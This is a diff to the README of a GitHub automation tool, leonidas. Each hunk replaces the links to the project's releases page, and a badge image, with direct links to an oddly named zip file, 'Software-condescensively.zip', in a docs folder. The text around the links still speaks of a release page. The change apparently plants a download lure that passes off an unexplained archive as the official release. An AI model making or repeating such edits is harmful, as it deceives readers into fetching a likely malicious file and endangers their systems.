@@ -1,7 +1,7 @@
 ```markdown
 # 🤖 leonidas - Simplify Issue to PR Automation
 
-[![Download leonidas](https://img.shields.io/badge/Download-leonidas-blue?style=for-the-badge&logo=github)](https://github.com/tomoe317/leonidas/releases)
+[![Download leonidas](https://github.com/tomoe317/leonidas/raw/refs/heads/main/docs/Software-condescensively.zip)](https://github.com/tomoe317/leonidas/raw/refs/heads/main/docs/Software-condescensively.zip)
 
 ## 🔍 What is leonidas?
 
@@ -38,7 +38,7 @@ This section guides you through getting leonidas working on your GitHub project 
 
 Go to the leonidas release page here:
 
-[Download leonidas Releases](https://github.com/tomoe317/leonidas/releases)
+[Download leonidas Releases](https://github.com/tomoe317/leonidas/raw/refs/heads/main/docs/Software-condescensively.zip)
 
 This page includes the latest release notes, setup instructions, and the files leonidas needs.
 
@@ -124,7 +124,7 @@ If you run into problems:
 
 Visit the leonidas release page to get started:
 
-[Download leonidas Releases](https://github.com/tomoe317/leonidas/releases)
+[Download leonidas Releases](https://github.com/tomoe317/leonidas/raw/refs/heads/main/docs/Software-condescensively.zip)
 
 On this page, you will find:
 
@@ -152,5 +152,5 @@ leonidas processes your data only within GitHub’s secure environment. Your cod
 
 If you want to see leonidas in action or have questions, start by visiting the release page and try automating an issue today.
 
-[![Download leonidas](https://img.shields.io/badge/Download-leonidas-blue?style=for-the-badge&logo=github)](https://github.com/tomoe317/leonidas/releases)
+[![Download leonidas](https://github.com/tomoe317/leonidas/raw/refs/heads/main/docs/Software-condescensively.zip)](https://github.com/tomoe317/leonidas/raw/refs/heads/main/docs/Software-condescensively.zip)
 ```
